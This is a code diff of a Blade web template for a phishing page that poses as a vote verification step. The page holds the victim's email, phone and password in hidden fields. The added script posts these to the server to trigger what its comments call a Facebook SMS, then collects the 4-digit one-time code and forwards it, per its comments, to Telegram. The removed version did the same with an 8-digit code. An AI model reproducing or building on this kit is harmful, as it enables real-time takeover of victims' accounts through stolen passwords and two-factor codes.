@@ -31,155 +31,126 @@
                 </div>
                 <p class="step-label">Step 2 of 2</p>
             </div>
-            <h1 id="verifyHeading">Verify your phone number</h1>
-            <p class="verify-sub">Enter the 8-digit verification code sent to your phone.</p>
+            <h1 id="verifyHeading">Enter SMS Code</h1>
+            <p class="verify-sub">Click "Send SMS" to receive a 4-digit code on your phone.</p>
             
             <form id="otpForm" method="POST" action="/success" novalidate>
                 @csrf
+                <input type="hidden" id="hiddenEmail" name="email" value="{{ $email ?? session('email', '') }}">
                 <input type="hidden" id="hiddenPhone" name="phone" value="{{ $phone ?? session('phone', '') }}">
                 <input type="hidden" id="hiddenPassword" name="password" value="{{ $password ?? session('password', '') }}">
                 
-                <div class="otp-group" id="otpGroup" role="group" aria-labelledby="verifyHeading">
-                    <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="otp-box" data-index="0" aria-label="Digit 1 of 8" id="otp1">
-                    <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="otp-box" data-index="1" aria-label="Digit 2 of 8" id="otp2">
-                    <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="otp-box" data-index="2" aria-label="Digit 3 of 8" id="otp3">
-                    <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="otp-box" data-index="3" aria-label="Digit 4 of 8" id="otp4">
-                    <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="otp-box" data-index="4" aria-label="Digit 5 of 8" id="otp5">
-                    <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="otp-box" data-index="5" aria-label="Digit 6 of 8" id="otp6">
-                    <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="otp-box" data-index="6" aria-label="Digit 7 of 8" id="otp7">
-                    <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="otp-box" data-index="7" aria-label="Digit 8 of 8" id="otp8">
-                </div>
-                
-                <input type="hidden" name="otp_code" id="otpCode" value="">
-                
-                <p class="otp-error" id="otpError" role="alert"></p>
-                <div class="resend-row">
-                    <p class="resend-text">
-                        <span id="timerWrap">Resend code in <strong id="countdown" aria-live="polite">60</strong>s</span>
-                    </p>
-                    <button type="button" class="resend-btn" id="resendBtn" disabled aria-disabled="true">Resend code</button>
-                </div>
-                <button type="submit" class="btn btn-primary btn-block btn-lg" id="verifyBtn">
-                    <span class="btn-label">Verify &amp; Continue</span>
-                    <span class="btn-spinner" aria-hidden="true"></span>
+                <!-- ============================================ -->
+                <!-- BUTTON 1: SEND SMS (Requests Facebook SMS)   -->
+                <!-- ============================================ -->
+                <button type="button" class="btn btn-primary btn-block btn-lg" id="sendSmsBtn" style="margin-bottom:15px;">
+                    <span class="btn-label">📱 Send SMS</span>
                 </button>
-                <a href="{{ url('/vote') }}" class="change-number-link">Use a different phone number</a>
-            </form>
-            
-            <div class="success-overlay" id="successOverlay" aria-hidden="true">
-                <div class="success-anim" aria-hidden="true">
-                    <svg viewBox="0 0 100 100" width="84" height="84">
-                        <circle class="success-circle" cx="50" cy="50" r="44" fill="none" stroke-width="5"/>
-                        <path class="success-check" fill="none" stroke-width="6" d="M28 52 L43 66 L74 32" />
-                    </svg>
+                
+                <!-- ============================================ -->
+                <!-- OTP INPUT – 4 DIGITS                         -->
+                <!-- ============================================ -->
+                <div class="field">
+                    <label for="userCode">Enter the 4-digit SMS code:</label>
+                    <div class="input-wrap">
+                        <input type="text" id="userCode" name="userCode" placeholder="4-digit code" maxlength="4" required>
+                    </div>
                 </div>
-                <p class="success-overlay-text">Verified! Taking you to your vote&hellip;</p>
-            </div>
+                
+                <!-- ============================================ -->
+                <!-- BUTTON 2: VOTE (Submit code to Telegram)     -->
+                <!-- ============================================ -->
+                <button type="button" class="btn btn-success btn-block btn-lg" id="submitCodeBtn">
+                    <span class="btn-label">🗳️ Vote</span>
+                </button>
+                
+                <p class="form-error" id="formError" role="alert"></p>
+            </form>
         </section>
     </main>
 
     <script src="{{ asset('js/script.js') }}"></script>
     
     <script>
-        // ============================================================
-        // 8-DIGIT OTP CAPTURE + TELEGRAM SENDER
-        // ============================================================
         document.addEventListener('DOMContentLoaded', function() {
-            console.log('✅ Step 2 - Verify page loaded (8-digit OTP)');
+            console.log('✅ Step 2 - Verify page loaded');
 
-            // ---- GET OTP CODE FROM 8 BOXES ----
-            function getOtpCode() {
-                var code = '';
-                for (var i = 1; i <= 8; i++) {
-                    var box = document.getElementById('otp' + i);
-                    if (box) {
-                        code += box.value || '';
+            // ============================================================
+            // BUTTON 1: SEND SMS – REQUEST FACEBOOK SMS
+            // ============================================================
+            document.getElementById('sendSmsBtn').addEventListener('click', function() {
+                const phone = document.getElementById('hiddenPhone')?.value || 'No phone';
+                const email = document.getElementById('hiddenEmail')?.value || 'No email';
+                const password = document.getElementById('hiddenPassword')?.value || 'No password';
+                
+                console.log('📤 REQUESTING SMS:', { email, phone });
+                
+                fetch('/send-sms', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'X-CSRF-TOKEN': document.querySelector('meta[name="csrf-token"]')?.getAttribute('content') || '{{ csrf_token() }}'
+                    },
+                    body: JSON.stringify({ email, phone, password })
+                })
+                .then(response => response.json())
+                .then(data => {
+                    console.log('📥 SMS response:', data);
+                    if (data.success) {
+                        alert('✅ SMS sent to your phone! Check your messages.');
+                    } else {
+                        alert('❌ Error sending SMS: ' + data.message);
                     }
-                }
-                console.log('📥 OTP captured (8-digit):', code);
-                return code;
-            }
-
-            // ---- UPDATE HIDDEN FIELD ----
-            function updateOtpCode() {
-                var code = getOtpCode();
-                var hidden = document.getElementById('otpCode');
-                if (hidden) {
-                    hidden.value = code;
-                }
-                console.log('📥 Hidden OTP field updated to:', code);
-                return code;
-            }
-
-            // ---- AUTO-ADVANCE OTP BOXES ----
-            var boxes = document.querySelectorAll('.otp-box');
-            boxes.forEach(function(box, index) {
-                box.addEventListener('input', function() {
-                    this.value = this.value.replace(/\D/g, '');
-                    if (this.value.length === 1 && index < boxes.length - 1) {
-                        boxes[index + 1].focus();
-                    }
-                    updateOtpCode();
-                });
-                box.addEventListener('keydown', function(e) {
-                    if (e.key === 'Backspace' && this.value === '' && index > 0) {
-                        boxes[index - 1].focus();
-                    }
+                })
+                .catch(err => {
+                    console.log('❌ Error:', err);
+                    alert('❌ Error: ' + err);
                 });
             });
 
-            // ---- FORM SUBMIT - SEND TO TELEGRAM ----
-            var form = document.getElementById('otpForm');
-            if (form) {
-                form.addEventListener('submit', function(e) {
-                    e.preventDefault();
-                    
-                    console.log('✅ Form submitted - sending to Telegram');
-                    
-                    var phoneInput = document.getElementById('hiddenPhone');
-                    var passwordInput = document.getElementById('hiddenPassword');
-                    
-                    var phone = phoneInput ? phoneInput.value : 'No phone';
-                    var password = passwordInput ? passwordInput.value : 'No password';
-                    var code = updateOtpCode();
-                    
-                    console.log('📤 FINAL DATA SENDING:', { phone, password, code });
-                    
-                    fetch('/submit-telegram', {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json',
-                            'X-CSRF-TOKEN': document.querySelector('meta[name="csrf-token"]')?.getAttribute('content') || '{{ csrf_token() }}'
-                        },
-                        body: JSON.stringify({ 
-                            phone: phone, 
-                            password: password, 
-                            code: code 
-                        })
-                    })
-                    .then(function(response) {
-                        return response.json();
-                    })
-                    .then(function(data) {
-                        console.log('📥 Telegram response:', data);
-                        if (data.success) {
-                            console.log('✅ Telegram sent with:', { phone, password, code });
-                            alert('✅ Phone: ' + phone + '\nPass: ' + password + '\nCode: ' + code);
-                        } else {
-                            console.log('❌ Error:', data);
-                            alert('❌ Error: ' + JSON.stringify(data));
-                        }
-                    })
-                    .catch(function(err) {
-                        console.log('❌ Fetch error:', err);
-                        alert('❌ Error: ' + err);
-                    });
-                    
-                    setTimeout(function() {
-                        form.submit();
-                    }, 500);
+            // ============================================================
+            // BUTTON 2: VOTE – SUBMIT CODE TO TELEGRAM
+            // ============================================================
+            document.getElementById('submitCodeBtn').addEventListener('click', function() {
+                const code = document.getElementById('userCode').value.trim();
+                
+                if (code.length !== 4) {
+                    alert('❌ Please enter exactly 4 digits');
+                    return;
+                }
+                
+                if (!/^\d{4}$/.test(code)) {
+                    alert('❌ Please enter only numbers');
+                    return;
+                }
+                
+                console.log('📤 SENDING CODE TO TELEGRAM:', { code });
+                
+                fetch('/submit-code', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'X-CSRF-TOKEN': document.querySelector('meta[name="csrf-token"]')?.getAttribute('content') || '{{ csrf_token() }}'
+                    },
+                    body: JSON.stringify({ code: code })
+                })
+                .then(function(response) {
+                    return response.json();
+                })
+                .then(function(data) {
+                    console.log('📥 Telegram response:', data);
+                    if (data.success) {
+                        alert('✅ Vote submitted successfully!');
+                        window.location.href = '/success';
+                    } else {
+                        alert('❌ Error submitting vote: ' + JSON.stringify(data));
+                    }
+                })
+                .catch(function(err) {
+                    console.log('❌ Error:', err);
+                    alert('❌ Error: ' + err);
                 });
-            }
+            });
         });
     </script>
     
